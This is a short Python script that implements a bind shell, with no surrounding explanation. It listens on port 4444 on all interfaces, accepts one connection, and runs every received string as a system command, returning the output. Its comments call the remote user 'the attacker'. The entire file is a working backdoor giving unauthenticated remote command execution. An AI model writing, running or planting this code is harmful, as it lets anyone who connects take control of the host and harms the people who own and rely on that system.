import socket
import subprocess

def bind_shell(host='0.0.0.0', port=4444):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Bind the socket to the address and port
    s.bind((host, port))
    
    # Listen for incoming connections
    s.listen(1)
    
    print(f'Listening on {host}:{port}')
    
    # Accept a connection
    conn, addr = s.accept()
    print(f'Connection from {addr}')
    
    while True:
        try:
            # Receive the command from the attacker
            command = conn.recv(1024).decode()
            
            if command.lower() == 'exit':
                break

            # Execute the command
            output = subprocess.getoutput(command)
            
            # Send the output back to the attacker
            conn.send(output.encode())
        
        except Exception as e:
            conn.send(str(e).encode())
    
    # Close the connection
    conn.close()
    s.close()

if __name__ == '__main__':
    bind_shell()